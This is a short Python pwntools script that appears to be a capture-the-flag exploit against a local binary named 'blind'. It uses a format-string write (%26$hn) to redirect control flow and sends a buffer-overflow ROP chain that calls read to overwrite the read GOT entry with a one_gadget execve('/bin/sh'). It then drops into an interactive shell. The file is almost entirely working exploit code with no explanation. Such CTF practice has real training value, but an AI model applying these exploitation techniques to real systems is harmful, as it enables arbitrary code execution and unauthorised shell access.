from pwn import *
import tty
context.log_level='debug'
context.terminal=['tmux','sp','-h']
p = process("./blind")
elf = ELF("./blind")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


p.recvuntil("???\n")
# gdb.attach(p,"b *0x400980")
# gdb.attach(p,'b *0x400929')
# raw_input()

p.send("%"+str(0x2b3)+"c%26$hn"+p64(0x400913))

sleep(0.2)

pop_rdi_ret = 0x0000000000400a43
pop_rsi_r15_ret = 0x0000000000400a41

payload = 'a'*(0x38)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15_ret) + p64(elf.got['read'])*2
payload += p64(elf.plt['read'])*2
p.send(payload)

'''
0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

sleep(0.5)
p.send(p16(0x8364)+'\x00')

p.interactive()